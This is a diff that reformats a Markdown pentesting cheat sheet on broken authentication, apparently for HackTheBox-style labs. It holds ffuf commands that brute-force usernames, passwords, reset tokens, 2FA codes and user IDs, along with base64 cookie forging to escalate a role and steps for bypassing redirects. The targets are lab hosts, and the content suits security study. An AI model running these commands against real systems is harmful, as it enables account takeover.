@@ -27,19 +27,19 @@ Weaknesses often arise from insufficient server-side validation, predictable or 
 ## Identification
 
 - Analyse login, reset, or MFA responses for differences that indicate valid vs. invalid usernames/accounts (varying error messages, HTTP status codes, response delays/timing, or account lockout behaviour).
-  - Status code changes between valid and invalid usernames.
-  - Different (sometimes subtle) error messages.
-  - Delayed responses for certain inputs.
-  - Correct usernames may receive a lockout message after a certain number of failed login attempts (while invalid usernames do not).
+    - Status code changes between valid and invalid usernames.
+    - Different (sometimes subtle) error messages.
+    - Delayed responses for certain inputs.
+    - Correct usernames may receive a lockout message after a certain number of failed login attempts (while invalid usernames do not).
 - Probe for absence of rate limiting or weak protections on authentication actions such as login attempts, password resets, and 2FA code submission.
-  - Correct/successful login details may receive a different rate limit response (or none) compared to failed attempts.
+    - Correct/successful login details may receive a different rate limit response (or none) compared to failed attempts.
 - Examine session cookies or other tokens for patterns: insufficient entropy, sequential/incrementing values, encoding of user data (e.g. base64), or large fixed portions with only small varying components.
-  - Check "stay logged in" or persistent cookies to see if they are easily decrypted or contain predictable data.
+    - Check "stay logged in" or persistent cookies to see if they are easily decrypted or contain predictable data.
 - Attempt direct navigation to protected URLs and observe whether authentication/authorisation is properly enforced server-side.
 - Review password reset and recovery flows for guessable tokens, logic issues (e.g. token not required after initial step), or information leakage.
-  - Check if a reset URL token is easily decrypted or predictable.
-  - Verify whether the reset token is actually required to complete the password reset after the initial link is followed.
-  - Test for different error messages when new password fields do not match (these differences can sometimes be abused to brute-force values for a victim's account during reset).
+    - Check if a reset URL token is easily decrypted or predictable.
+    - Verify whether the reset token is actually required to complete the password reset after the initial link is followed.
+    - Test for different error messages when new password fields do not match (these differences can sometimes be abused to brute-force values for a victim's account during reset).
 - Test whether client-side controls, parameter values, or response status codes can be manipulated to bypass authentication.
 
 ## Exploitation
@@ -47,27 +47,20 @@ Weaknesses often arise from insufficient server-side validation, predictable or 
 ### Brute-Force Attacks
 
 - **User Enumeration** 
-
 ```bash
 ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
 ```
-
 - **Brute-Forcing Passwords**
-
 ```bash
 grep '[[:upper:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
 ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password"
 ```
-
 - **Brute-Forcing Password Reset Tokens** (example based on weak 4 digit reset token sent via email)
-
 ```bash
 seq -w 0 9999 > tokens.txt # -w pads numbers with prepending zeros
 ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
 ```
-
 - **Brute-Forcing 2FA Codes** (example based on weak 4 digit TOTP token)
-
 ```bash
 seq -w 0 9999 > tokens.txt
 ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
@@ -108,12 +101,12 @@ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST 
 ### Authentication Bypasses
 
 - Accessing the protected page directly
-  - go directly to hidden page /admin.php
-  - catch the response in burp
-  - change status code from 302 to 200
+    - go directly to hidden page /admin.php
+    - catch the response in burp
+    - change status code from 302 to 200
 - Manipulating HTTP Parameters to access protected pages
-  - Log in as regular user directs to /admin.php?user_id=183
-  - guess or bruteforce id parameter
+    - Log in as regular user directs to /admin.php?user_id=183
+    - guess or bruteforce id parameter
 ```bash
 seq 1 1000 > user_ids.txt
 ffuf -w user_ids.txt -u http://STMIP:STMPO/admin.php?user_id=FUZZ -fr "Could not load admin data."
@@ -121,9 +114,9 @@ ffuf -w user_ids.txt -u http://STMIP:STMPO/admin.php?user_id=FUZZ -fr "Could not
 
 ### Session Attacks
 
-- **Cookies**
-  - Check if "stay logged in" or persistent cookies are easily decrypted or contain guessable/predictable values (see token analysis examples below).
-  - Brute-Forcing cookies with insufficient entropy
+#### Cookies
+- Check if "stay logged in" or persistent cookies are easily decrypted or contain guessable/predictable values (see token analysis examples below).
+- Brute-Forcing cookies with insufficient entropy
     - Capture multiple session tokens and compare for similarities
     - Session cookie may be long but most of it is fixed with only a small amount changing with each user
     - Session cookies could also increment and not be random thus easy to enumerate past/future session tokens
@@ -134,15 +127,15 @@ echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
 echo -n 'user=htb-stdnt;role=admin' | base64 # base64 encode
 echo -n 'user=htb-stdnt;role=admin' | xxd -p # hex encode
 ```
-  - XSS can be used to steal session cookies from other users (see related XSS documentation).
+    - XSS can be used to steal session cookies from other users (see related XSS documentation).
 - **[Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)**
-  - Attacker obtains valid session identifier
-  - Attacker coerces victim to use this session identifier (social engineering)
-  - Victim authenticates to the vulnerable web application
-  - Attacker knows the victim's session identifier and can hijack their account
+    - Attacker obtains valid session identifier
+    - Attacker coerces victim to use this session identifier (social engineering)
+    - Victim authenticates to the vulnerable web application
+    - Attacker knows the victim's session identifier and can hijack their account
 - **[Improper Session Timeout](https://owasp.org/www-community/Session_Timeout)**
-  - Sessions should expire after an appropriate time interval
-  - Session validity duration depends on the web application
+    - Sessions should expire after an appropriate time interval
+    - Session validity duration depends on the web application
 
 ## Impact
 
